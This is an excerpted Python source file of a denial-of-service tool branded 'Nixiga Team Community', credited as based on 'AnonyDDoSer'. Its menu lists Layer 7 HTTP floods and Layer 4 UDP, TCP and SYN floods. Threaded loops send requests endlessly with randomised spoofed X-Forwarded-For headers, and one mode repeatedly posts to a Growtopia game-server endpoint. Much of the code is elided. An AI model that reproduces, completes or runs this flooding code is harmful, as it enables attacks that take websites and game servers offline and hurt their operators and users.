...
try:
    ...
    if sys.platform.startswith("linux"):
        ...
        os.system("pip install pysocks socks requests wget cfscrape urllib3 scapy")
...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Nixiga Team Community")
    print('''
 __    _  ___   __   __  ______   ______   _______  _______ 
|  |  | ||   | |  |_|  ||      | |      | |       ||       |
|   |_| ||   | |       ||  _    ||  _    ||   _   ||  _____|
|       ||   | |       || | |   || | |   ||  | |  || |_____ 
|  _    ||   |  |     | | |_|   || |_|   ||  |_|  ||_____  |
| | |   ||   | |   _   ||       ||       ||       | _____| |
|_|  |__||___| |__| |__||______| |______| |_______||_______|
!        This tool based on AnonyDDoSer by PassDDoS        !
    ''')
    try:
...
def start_mode():
    ...
    print("""
[+]=====[ Layer 7 ]=====[+]=======[ Layer 4 ]=======[+]
 # 0: Home      [ Home ] # 5: UDP Flood     [ DDoS ] #
 # 1: Proxy     [ DDoS ] # 6: TCP-SYN Flood [ BETA ] #
 # 2: Socks     [ DDoS ] # 7: TCP-Flood     [ DDoS ] #
 # 3: JS-Normal [ Home ] #                           #
 # 4: Raw-DoS   [ Home ] #                           #
[+]=================================================[+]
""")
...
class raw_dos(threading.Thread):
    ...
    def run(self):
        ...
        if method_attack == "1":
            ...
            requests.post(url+ "/growtopia/server_data.php", headers=headersx)
        while True:
            try:
                if method_attack == "1":
                    requests.get(url, headers=headersx)
                    ...
                    requests.post(url+ "/growtopia/server_data.php", headers=headersx)
                print("[+] Official Nixiga Team Community | Raw-DoS => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                #sys.stdout.flush()
                #print("[!] Official Nixiga Team Community | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
...
class Home(threading.Thread):
    ...
    def run(self):
        ...
        accept    = random.choice(acceptall)
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        forward = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        if method_attack == "1":
            get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + content + length + "\r\n"
        else:
            get_host = "POST /growtopia/server_data.php HTTP/1.0\r\nHost: growtopia1.com\r\n"
            request  = get_host + useragent + accept + "X-Forwarded-For: "+ forward + "\r\n" + referer + content + length + "\r\n"
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(host_url), int(port)))
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] Official Nixiga Team Community | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] Official Nixiga Team Community | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
...
def tcpflood():
    ...
    while True:
        try:
            ...
            req_code += 1
            s.send(bytes)
            sys.stdout.write("[+] TCP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
            try:
                for y in range(multiple):
                    s.send(bytes)
